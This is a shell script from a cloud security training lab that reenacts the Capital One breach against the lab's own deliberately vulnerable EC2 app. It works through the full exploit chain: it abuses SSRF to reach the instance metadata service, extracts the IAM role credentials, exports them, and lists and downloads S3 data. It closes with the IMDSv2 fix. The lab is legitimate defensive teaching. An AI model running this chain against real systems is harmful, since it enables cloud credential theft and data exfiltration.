#!/bin/bash

# Lab 02: SSRF Attack Demonstration
# Simulates the Capital One attack pattern

echo ""
echo "=============================================="
echo "  SSRF ATTACK DEMONSTRATION"
echo "  Simulating the Capital One Breach"
echo "=============================================="
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Check if stack exists
STACK_STATUS=$(aws cloudformation describe-stacks --stack-name lab02-ssrf-attack --query 'Stacks[0].StackStatus' --output text 2>/dev/null)
if [ -z "$STACK_STATUS" ] || [ "$STACK_STATUS" = "None" ]; then
    echo -e "${RED}ERROR: Stack 'lab02-ssrf-attack' not found.${NC}"
    echo "Deploy it first with:"
    echo "  aws cloudformation create-stack --stack-name lab02-ssrf-attack \\"
    echo "    --template-body file://templates/ssrf-lab.yaml \\"
    echo "    --capabilities CAPABILITY_NAMED_IAM"
    exit 1
fi

if [ "$STACK_STATUS" != "CREATE_COMPLETE" ] && [ "$STACK_STATUS" != "UPDATE_COMPLETE" ]; then
    echo -e "${YELLOW}WARNING: Stack status is $STACK_STATUS - wait for CREATE_COMPLETE${NC}"
    exit 1
fi

# Get instance IP
EC2_IP=$(aws cloudformation describe-stacks \
    --stack-name lab02-ssrf-attack \
    --query 'Stacks[0].Outputs[?OutputKey==`InstancePublicIp`].OutputValue' \
    --output text)

if [ -z "$EC2_IP" ] || [ "$EC2_IP" = "None" ]; then
    echo -e "${RED}ERROR: Could not get EC2 IP address${NC}"
    exit 1
fi

echo -e "${BLUE}Target: http://$EC2_IP${NC}"
echo ""

# Step 1: Check if app is running
echo "----------------------------------------------"
echo -e "${BLUE}[Step 1] Checking if vulnerable app is running${NC}"
echo "----------------------------------------------"
echo ""
echo "Command: curl http://$EC2_IP/health"
echo ""

HEALTH=$(curl -s --connect-timeout 5 "http://$EC2_IP/health" 2>/dev/null)
if [ -z "$HEALTH" ] || [[ "$HEALTH" != *"healthy"* ]]; then
    echo -e "${YELLOW}App not ready yet. Wait 2-3 minutes after stack creation.${NC}"
    echo "Check status with: curl http://$EC2_IP/health"
    exit 1
fi

echo -e "${GREEN}App is running!${NC}"
echo ""

# Step 2: Test SSRF
echo "----------------------------------------------"
echo -e "${BLUE}[Step 2] Testing SSRF vulnerability${NC}"
echo "----------------------------------------------"
echo ""
echo "Can we reach the metadata service through the app?"
echo ""
echo "Command: curl \"http://$EC2_IP/fetch?url=http://169.254.169.254/\""
echo ""

META_TEST=$(curl -s "http://$EC2_IP/fetch?url=http://169.254.169.254/" 2>/dev/null)
if [[ "$META_TEST" == *"latest"* ]]; then
    echo -e "${RED}[VULNERABLE] Metadata service is reachable via SSRF!${NC}"
    echo ""
    echo "Response:"
    echo "$META_TEST"
else
    echo -e "${GREEN}[BLOCKED] Metadata service is not reachable.${NC}"
    echo "IMDSv2 may already be enabled."
    echo ""
    echo "Response: $META_TEST"
    exit 0
fi
echo ""

# Step 3: Get role name
echo "----------------------------------------------"
echo -e "${BLUE}[Step 3] Discovering IAM role${NC}"
echo "----------------------------------------------"
echo ""
echo "Command: curl \"http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\""
echo ""

ROLE_NAME=$(curl -s "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
echo -e "${YELLOW}Found IAM Role: $ROLE_NAME${NC}"
echo ""

# Step 4: Extract credentials
echo "----------------------------------------------"
echo -e "${BLUE}[Step 4] Extracting IAM credentials${NC}"
echo "----------------------------------------------"
echo ""
echo "Command: curl \"http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\""
echo ""

CREDS=$(curl -s "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME" 2>/dev/null)

echo -e "${RED}[STOLEN CREDENTIALS]${NC}"
echo ""
echo "$CREDS" | head -20
echo ""

# Parse credentials
ACCESS_KEY=$(echo "$CREDS" | grep -o '"AccessKeyId" : "[^"]*"' | cut -d'"' -f4)
SECRET_KEY=$(echo "$CREDS" | grep -o '"SecretAccessKey" : "[^"]*"' | cut -d'"' -f4)
TOKEN=$(echo "$CREDS" | grep -o '"Token" : "[^"]*"' | cut -d'"' -f4)

if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ]; then
    echo -e "${RED}Failed to parse credentials${NC}"
    exit 1
fi

# Step 5: Use stolen credentials
echo "----------------------------------------------"
echo -e "${BLUE}[Step 5] Using stolen credentials${NC}"
echo "----------------------------------------------"
echo ""

# Temporarily export credentials
export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$TOKEN"

echo "Checking identity with stolen credentials..."
echo ""
IDENTITY=$(aws sts get-caller-identity 2>/dev/null)
echo "$IDENTITY"
echo ""

# Step 6: Access S3
echo "----------------------------------------------"
echo -e "${BLUE}[Step 6] Accessing S3 with stolen credentials${NC}"
echo "----------------------------------------------"
echo ""

echo "Listing accessible buckets..."
aws s3 ls 2>/dev/null | grep lab02
echo ""

BUCKET=$(aws s3 ls 2>/dev/null | grep lab02-ssrf-data | awk '{print $3}')
if [ -n "$BUCKET" ]; then
    echo "Found bucket: $BUCKET"
    echo ""
    echo "Contents:"
    aws s3 ls "s3://$BUCKET/" 2>/dev/null
    echo ""

    echo -e "${RED}Downloading sensitive data...${NC}"
    echo ""
    aws s3 cp "s3://$BUCKET/sensitive-data.txt" - 2>/dev/null
fi

# Clean up credentials
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

echo ""
echo "=============================================="
echo -e "${RED}  ATTACK COMPLETE - BREACH SIMULATED${NC}"
echo "=============================================="
echo ""
echo "You just performed the Capital One attack:"
echo ""
echo "  1. Exploited SSRF vulnerability"
echo "  2. Accessed metadata service (IMDSv1)"
echo "  3. Stole IAM credentials"
echo "  4. Used credentials to access S3"
echo "  5. Downloaded sensitive data"
echo ""
echo -e "${YELLOW}NEXT: Fix this by enabling IMDSv2:${NC}"
echo ""
echo "  INSTANCE_ID=\$(aws cloudformation describe-stacks \\"
echo "    --stack-name lab02-ssrf-attack \\"
echo "    --query 'Stacks[0].Outputs[?OutputKey==\`InstanceId\`].OutputValue' \\"
echo "    --output text)"
echo ""
echo "  aws ec2 modify-instance-metadata-options \\"
echo "    --instance-id \$INSTANCE_ID \\"
echo "    --http-tokens required"
echo ""
echo "Then run: ./scripts/verify-fix.sh"
echo ""
